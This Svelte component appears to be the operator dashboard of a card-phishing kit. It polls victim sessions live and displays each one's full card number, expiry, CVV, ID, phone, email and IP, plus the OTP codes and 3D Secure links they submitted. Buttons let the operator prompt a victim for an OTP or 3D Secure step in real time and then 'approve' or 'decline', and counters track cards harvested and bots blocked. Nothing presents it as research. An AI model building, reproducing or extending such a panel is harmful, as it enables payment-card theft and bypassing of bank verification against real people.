<script>
  import { onMount, onDestroy } from 'svelte';

  let sessions = [];
  let stats = { visits:0, botsBlocked:0, cards:0, otps:0, links3ds:0, successes:0, declines:0, uptimeSec:0 };
  let timer;
  let toast = '';
  let toastTimer;
  let filter = 'all'; // all | active | pending | done
  let collapsed = new Set();
  let sortBy = 'newest'; // newest | oldest | updated

  async function load() {
    try {
      const r = await fetch('/api/sessions');
      const d = await r.json();
      sessions = d.sessions || [];
      if (d.stats) stats = d.stats;
    } catch {}
  }

  async function setMode(id, a) {
    await fetch(`/api/set-mode?s=${encodeURIComponent(id)}&a=${a}`);
    showToast(labelFor(a) + ' sent');
    load();
  }

  async function removeSession(id) {
    if (!confirm('Delete this session?')) return;
    await fetch(`/api/delete-session?s=${encodeURIComponent(id)}`, { method: 'POST' });
    showToast('Session deleted');
    load();
  }

  function showToast(msg) {
    toast = msg;
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => (toast = ''), 2200);
  }

  function labelFor(a) {
    return { otp: 'OTP', '3ds': '3D Secure', success: 'Success', decline: 'Decline' }[a] || a;
  }

  function copy(v) {
    if (!v) return;
    navigator.clipboard?.writeText(String(v));
    showToast('Copied');
  }

  function toggle(id) {
    if (collapsed.has(id)) collapsed.delete(id);
    else collapsed.add(id);
    collapsed = new Set(collapsed);
  }

  function fmtUptime(sec) {
    const h = Math.floor(sec / 3600);
    const m = Math.floor((sec % 3600) / 60);
    const s = sec % 60;
    return `${h}h ${m}m ${s}s`;
  }

  function timeAgo(ts) {
    if (!ts) return '';
    const diff = Math.floor((Date.now() - ts) / 1000);
    if (diff < 5) return 'just now';
    if (diff < 60) return diff + 's ago';
    if (diff < 3600) return Math.floor(diff/60) + 'm ago';
    if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
    return Math.floor(diff/86400) + 'd ago';
  }

  function detectBrand(num = '') {
    const n = String(num).replace(/\D/g, '');
    if (/^4/.test(n)) return { name: 'Visa', color: '#1a1f71' };
    if (/^(5[1-5]|2[2-7])/.test(n)) return { name: 'Mastercard', color: '#eb001b' };
    if (/^3[47]/.test(n)) return { name: 'Amex', color: '#2e77bb' };
    if (/^6(011|5|4[4-9])/.test(n)) return { name: 'Discover', color: '#f68121' };
    if (/^35/.test(n)) return { name: 'JCB', color: '#0e4c96' };
    if (/^3(0[0-5]|[68])/.test(n)) return { name: 'Diners', color: '#0079be' };
    return { name: 'Card', color: '#666' };
  }

  function formatCard(num) {
    if (!num) return '';
    const n = String(num).replace(/\D/g, '');
    return n.replace(/(.{4})/g, '$1 ').trim();
  }

  $: counts = {
    all: sessions.length,
    pending: sessions.filter((s) => !s.action || s.action === 'pending').length,
    active: sessions.filter((s) => s.action === 'otp' || s.action === '3ds').length,
    done: sessions.filter((s) => s.action === 'success' || s.action === 'decline').length
  };

  $: filtered = sessions
    .filter((s) => {
      if (filter === 'all') return true;
      if (filter === 'active') return ['otp','3ds'].includes(s.action);
      if (filter === 'pending') return s.action === 'pending' || !s.action;
      if (filter === 'done') return ['success','decline'].includes(s.action);
      return true;
    })
    .sort((a, b) => {
      if (sortBy === 'oldest') return (a.createdAt||0) - (b.createdAt||0);
      if (sortBy === 'updated') return (b.updatedAt||0) - (a.updatedAt||0);
      return (b.createdAt||0) - (a.createdAt||0); // newest
    });

  onMount(() => { load(); timer = setInterval(load, 2000); });
  onDestroy(() => clearInterval(timer));
</script>

<svelte:head><title>Control Panel</title></svelte:head>

<main>
  <header>
    <div>
      <h1>Control Panel</h1>
      <div class="hint">
        <span class="pulse"></span> Live · refresh 2s · uptime {fmtUptime(stats.uptimeSec)}
      </div>
    </div>
    <a class="live-btn" href="/" target="_blank" rel="noopener">Open site ↗</a>
  </header>

  <section class="stats">
    <div class="stat visits"><div class="n">{stats.visits}</div><div class="l">Visits</div></div>
    <div class="stat cards"><div class="n">{stats.cards}</div><div class="l">Cards</div></div>
    <div class="stat otps"><div class="n">{stats.otps}</div><div class="l">OTP Submits</div></div>
    <div class="stat tds"><div class="n">{stats.links3ds}</div><div class="l">3DS Links</div></div>
    <div class="stat ok"><div class="n">{stats.successes}</div><div class="l">Successes</div></div>
    <div class="stat bad"><div class="n">{stats.declines}</div><div class="l">Declines</div></div>
    <div class="stat bots"><div class="n">{stats.botsBlocked}</div><div class="l">Bots Blocked</div></div>
    <div class="stat live"><div class="n">{sessions.length}</div><div class="l">Active</div></div>
  </section>

  <div class="toolbar">
    <div class="tabs">
      <button class:on={filter==='all'}     on:click={() => filter='all'}>All ({counts.all})</button>
      <button class:on={filter==='pending'} on:click={() => filter='pending'}>Pending ({counts.pending})</button>
      <button class:on={filter==='active'}  on:click={() => filter='active'}>Active ({counts.active})</button>
      <button class:on={filter==='done'}    on:click={() => filter='done'}>Done ({counts.done})</button>
    </div>
    <select bind:value={sortBy}>
      <option value="newest">Newest first</option>
      <option value="oldest">Oldest first</option>
      <option value="updated">Recently updated</option>
    </select>
  </div>

  {#if filtered.length === 0}
    <p class="empty">No sessions match this filter</p>
  {:else}
    <div class="list">
      {#each filtered as s (s.id)}
        {@const brand = detectBrand(s.data?.ccnn1)}
        {@const isCollapsed = collapsed.has(s.id)}
        <article class="session" class:otp={s.action==='otp'} class:tds={s.action==='3ds'} class:ok={s.action==='success'} class:bad={s.action==='decline'}>

          <div class="row1">
            <div class="left">
              <span class="badge" style="background:{brand.color}">{brand.name}</span>
              <strong class="last4">{formatCard(s.data?.ccnn1) || '—'}</strong>
              <span class="name">{s.data?.name ?? ''} {s.data?.namel ?? ''}</span>
            </div>
            <div class="right">
              <span class="state state-{s.action ?? 'pending'}">{s.action ?? 'pending'}</span>
              <span class="ago" title={new Date(s.createdAt ?? Date.now()).toLocaleString()}>{timeAgo(s.createdAt)}</span>
              <button class="icon" on:click={() => toggle(s.id)} title={isCollapsed ? 'Expand' : 'Collapse'}>
                {isCollapsed ? '▸' : '▾'}
              </button>
              <button class="icon danger" on:click={() => removeSession(s.id)} title="Delete">✕</button>
            </div>
          </div>

          {#if !isCollapsed}
            <div class="body">
              <div class="grid">
                {#if s.data?.ccnn1}<button class="kv" on:click={() => copy(s.data.ccnn1)} title="Click to copy"><span class="k">Card</span><span class="v mono">{formatCard(s.data.ccnn1)}</span></button>{/if}
                {#if s.data?.expiry}<button class="kv" on:click={() => copy(s.data.expiry)}><span class="k">Exp</span><span class="v mono">{s.data.expiry}</span></button>{/if}
                {#if s.data?.cvs}<button class="kv" on:click={() => copy(s.data.cvs)}><span class="k">CVV</span><span class="v mono">{s.data.cvs}</span></button>{/if}
                {#if s.data?.id}<button class="kv" on:click={() => copy(s.data.id)}><span class="k">ID</span><span class="v mono">{s.data.id}</span></button>{/if}
                {#if s.data?.nocphone2}<button class="kv" on:click={() => copy(s.data.nocphone2)}><span class="k">Phone</span><span class="v">{s.data.nocphone2}</span></button>{/if}
                {#if s.data?.em1}<button class="kv" on:click={() => copy(s.data.em1)}><span class="k">Email</span><span class="v">{s.data.em1}</span></button>{/if}
                {#if s.data?.ip}<button class="kv" on:click={() => copy(s.data.ip)}><span class="k">IP</span><span class="v mono">{s.data.ip}</span></button>{/if}
              </div>

              {#if (s.data?.otps?.length) || (s.data?.links?.length)}
                <div class="submitted">
                  {#if s.data?.otps?.length}
                    <div class="hit-group">
                      <div class="hit-title">🔑 OTP Submissions ({s.data.otps.length})</div>
                      {#each [...s.data.otps].reverse() as entry, i}
                        <button class="hit otp-hit" on:click={() => copy(entry.value)} title="Click to copy">
                          <span class="hit-idx">#{s.data.otps.length - i}</span>
                          <span class="hit-v">{entry.value}</span>
                          <span class="hit-ago">{timeAgo(entry.at)}</span>
                        </button>
                      {/each}
                    </div>
                  {/if}
                  {#if s.data?.links?.length}
                    <div class="hit-group">
                      <div class="hit-title">🔗 3DS Link Submissions ({s.data.links.length})</div>
                      {#each [...s.data.links].reverse() as entry, i}
                        <button class="hit tds-hit" on:click={() => copy(entry.value)}>
                          <span class="hit-idx">#{s.data.links.length - i}</span>
                          <span class="hit-v mono">{entry.value}</span>
                          <span class="hit-ago">{timeAgo(entry.at)}</span>
                        </button>
                      {/each}
                    </div>
                  {/if}
                </div>
              {/if}

              <div class="controls">
                <div class="ctrl-group">
                  <div class="ctrl-label">Request from visitor</div>
                  <div class="ctrl-row">
                    <button class="ctl otp-btn" class:active={s.action==='otp'} on:click={() => setMode(s.id, 'otp')}>
                      <span class="emoji">🔑</span> Ask OTP
                    </button>
                    <button class="ctl tds-btn" class:active={s.action==='3ds'} on:click={() => setMode(s.id, '3ds')}>
                      <span class="emoji">🔗</span> Ask 3D Secure
                    </button>
                  </div>
                </div>
                <div class="ctrl-group">
                  <div class="ctrl-label">Finish flow</div>
                  <div class="ctrl-row">
                    <button class="ctl ok-btn" on:click={() => setMode(s.id, 'success')}>
                      <span class="emoji">✅</span> Approve
                    </button>
                    <button class="ctl no-btn" on:click={() => setMode(s.id, 'decline')}>
                      <span class="emoji">❌</span> Decline / Wrong
                    </button>
                  </div>
                </div>
              </div>

              <div class="meta">
                <code>{s.id}</code>
                <span>seq {s.seq ?? 0}</span>
                {#if s.updatedAt}<span>updated {timeAgo(s.updatedAt)}</span>{/if}
              </div>
            </div>
          {/if}
        </article>
      {/each}
    </div>
  {/if}
</main>

{#if toast}
  <div class="toast">{toast}</div>
{/if}

<style>
  :global(body) { background: #0f1117; color: #e4e6eb; margin:0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
  main { max-width: 1080px; margin: 0 auto; padding: 28px 22px 80px; }

  header { display:flex; justify-content:space-between; align-items:center; gap:16px; margin-bottom: 22px; flex-wrap:wrap; }
  header h1 { margin:0 0 4px; font-size:24px; }
  .hint { color:#8b93a7; font-size:13px; display:flex; align-items:center; gap:8px; }
  .pulse { width:8px; height:8px; border-radius:50%; background:#2ecc71; box-shadow:0 0 0 0 rgba(46,204,113,.7); animation:pulse 1.8s infinite; }
  @keyframes pulse { 0%{box-shadow:0 0 0 0 rgba(46,204,113,.7)} 70%{box-shadow:0 0 0 10px rgba(46,204,113,0)} 100%{box-shadow:0 0 0 0 rgba(46,204,113,0)} }
  .live-btn { background:#252938; border:1px solid #3a4055; color:#e4e6eb; padding:8px 14px; border-radius:8px; font-size:13px; text-decoration:none; }
  .live-btn:hover { background:#2d3246; }

  /* Stats */
  .stats { display:grid; grid-template-columns:repeat(auto-fit, minmax(125px, 1fr)); gap:10px; margin-bottom:22px; }
  .stat { background:#1a1d29; border:1px solid #252938; border-radius:12px; padding:14px 16px; border-top:3px solid #555; }
  .stat .n { font-size:24px; font-weight:800; line-height:1; }
  .stat .l { font-size:11px; color:#8b93a7; margin-top:6px; text-transform:uppercase; letter-spacing:.7px; }
  .stat.visits { border-top-color:#3498db; }
  .stat.cards  { border-top-color:#e67e22; }
  .stat.otps   { border-top-color:#9b59b6; }
  .stat.tds    { border-top-color:#1abc9c; }
  .stat.ok     { border-top-color:#2ecc71; }
  .stat.bad    { border-top-color:#e74c3c; }
  .stat.bots   { border-top-color:#7f8c8d; }
  .stat.live   { border-top-color:#f39c12; }

  /* Toolbar */
  .toolbar { display:flex; justify-content:space-between; gap:12px; margin-bottom:16px; flex-wrap:wrap; }
  .tabs { display:flex; gap:4px; background:#1a1d29; padding:4px; border-radius:10px; border:1px solid #252938; }
  .tabs button { background:transparent; border:none; color:#8b93a7; padding:7px 14px; border-radius:7px; font-size:13px; cursor:pointer; font-weight:500; }
  .tabs button.on { background:#3498db; color:#fff; }
  .tabs button:hover:not(.on) { color:#e4e6eb; }
  select { background:#1a1d29; border:1px solid #252938; color:#e4e6eb; padding:8px 12px; border-radius:8px; font-size:13px; }

  .empty { color:#6b7389; text-align:center; padding:60px 20px; border:2px dashed #252938; border-radius:12px; background:#151824; }

  /* Sessions */
  .list { display:flex; flex-direction:column; gap:14px; }
  .session {
    background:#1a1d29; border:1px solid #252938; border-radius:14px; padding:14px 16px;
    transition: border-color .15s;
  }
  .session.otp { border-left:4px solid #3498db; }
  .session.tds { border-left:4px solid #9b59b6; }
  .session.ok  { border-left:4px solid #2ecc71; opacity:.75; }
  .session.bad { border-left:4px solid #e74c3c; opacity:.75; }

  .row1 { display:flex; justify-content:space-between; align-items:center; gap:12px; flex-wrap:wrap; }
  .left { display:flex; align-items:center; gap:10px; flex-wrap:wrap; }
  .right { display:flex; align-items:center; gap:8px; }
  .badge { color:#fff; padding:3px 9px; border-radius:5px; font-size:11px; font-weight:700; letter-spacing:.5px; }
  .last4 { font-family: "SF Mono", Menlo, monospace; font-size:15px; letter-spacing:1px; }
  .name { color:#b0b8c9; font-size:14px; }
  .ago { color:#6b7389; font-size:12px; }
  .state { padding:3px 10px; border-radius:10px; font-size:11px; font-weight:600; text-transform:uppercase; letter-spacing:.5px; }
  .state-pending { background:#2a2f40; color:#8b93a7; }
  .state-otp     { background:#3498db33; color:#5dade2; }
  .state-3ds     { background:#9b59b633; color:#bb8fce; }
  .state-success { background:#2ecc7133; color:#58d68d; }
  .state-decline { background:#e74c3c33; color:#ec7063; }

  .icon { background:transparent; border:1px solid #2a2f40; color:#8b93a7; width:28px; height:28px; border-radius:6px; cursor:pointer; font-size:13px; display:flex; align-items:center; justify-content:center; }
  .icon:hover { background:#252938; color:#e4e6eb; }
  .icon.danger:hover { background:#e74c3c; border-color:#e74c3c; color:#fff; }

  .body { margin-top:14px; }
  .grid { display:grid; grid-template-columns:repeat(auto-fill, minmax(180px, 1fr)); gap:6px; margin-bottom:14px; }
  .kv { background:#151824; border:1px solid #252938; border-radius:8px; padding:8px 10px; text-align:left; cursor:pointer; display:flex; flex-direction:column; gap:2px; color:#e4e6eb; font-family:inherit; transition: all .1s; }
  .kv:hover { background:#1e2232; border-color:#3a4055; }
  .kv .k { font-size:10px; color:#6b7389; text-transform:uppercase; letter-spacing:.5px; }
  .kv .v { font-size:13px; color:#e4e6eb; word-break:break-all; }
  .mono { font-family: "SF Mono", Menlo, monospace; }

  .submitted { display:flex; flex-direction:column; gap:14px; margin-bottom:14px; }
  .hit-group { background:#151824; border:1px solid #252938; border-radius:10px; padding:10px 12px; display:flex; flex-direction:column; gap:6px; }
  .hit-title { font-size:11px; color:#8b93a7; font-weight:700; text-transform:uppercase; letter-spacing:.7px; margin-bottom:4px; }
  .hit { background:#1a1d29; border:1px solid #252938; border-left:3px solid; border-radius:7px; padding:8px 12px; text-align:left; cursor:pointer; color:#e4e6eb; font-family:inherit; display:flex; align-items:center; gap:12px; }
  .hit:hover { background:#1e2232; }
  .otp-hit { border-left-color:#9b59b6; }
  .tds-hit { border-left-color:#1abc9c; }
  .hit-idx { font-size:11px; color:#6b7389; font-family:"SF Mono",Menlo,monospace; flex-shrink:0; min-width:28px; }
  .hit-v { flex:1; font-size:14px; font-weight:700; font-family:"SF Mono",Menlo,monospace; color:#fff; letter-spacing:2px; word-break:break-all; }
  .tds-hit .hit-v { letter-spacing:0; font-size:12px; font-weight:500; }
  .hit-ago { font-size:11px; color:#6b7389; flex-shrink:0; }

  .controls { display:flex; gap:14px; flex-wrap:wrap; margin-bottom:10px; }
  .ctrl-group { flex:1; min-width:240px; background:#151824; border:1px solid #252938; border-radius:10px; padding:10px 12px; }
  .ctrl-label { font-size:10px; color:#6b7389; text-transform:uppercase; letter-spacing:.7px; margin-bottom:8px; font-weight:600; }
  .ctrl-row { display:flex; gap:6px; }
  .ctl { flex:1; background:#252938; border:1px solid transparent; color:#e4e6eb; padding:10px 12px; border-radius:8px; cursor:pointer; font-size:13px; font-weight:600; display:flex; align-items:center; justify-content:center; gap:6px; transition: all .12s; font-family:inherit; }
  .ctl:hover { transform:translateY(-1px); }
  .ctl .emoji { font-size:15px; }
  .ctl.active { box-shadow:inset 0 0 0 2px currentColor; }
  .otp-btn { background:#3498db; color:#fff; }
  .otp-btn:hover { background:#2980b9; }
  .tds-btn { background:#9b59b6; color:#fff; }
  .tds-btn:hover { background:#8e44ad; }
  .ok-btn  { background:#27ae60; color:#fff; }
  .ok-btn:hover  { background:#229954; }
  .no-btn  { background:#c0392b; color:#fff; }
  .no-btn:hover  { background:#a93226; }

  .meta { display:flex; gap:14px; font-size:11px; color:#6b7389; padding-top:10px; border-top:1px solid #252938; flex-wrap:wrap; }
  .meta code { background:#151824; padding:2px 6px; border-radius:4px; font-family: "SF Mono", Menlo, monospace; color:#8b93a7; }

  /* Toast */
  .toast { position:fixed; bottom:24px; left:50%; transform:translateX(-50%); background:#2ecc71; color:#fff; padding:10px 20px; border-radius:999px; font-size:13px; font-weight:600; box-shadow:0 10px 30px rgba(0,0,0,.4); animation: toastIn .2s; z-index:100; }
  @keyframes toastIn { from { opacity:0; transform:translate(-50%, 10px); } to { opacity:1; transform:translate(-50%, 0); } }

  @media (max-width: 600px) {
    .row1 { flex-direction:column; align-items:flex-start; }
    .right { width:100%; justify-content:space-between; }
    .controls { flex-direction:column; }
    .ctrl-group { min-width:0; }
  }
</style>
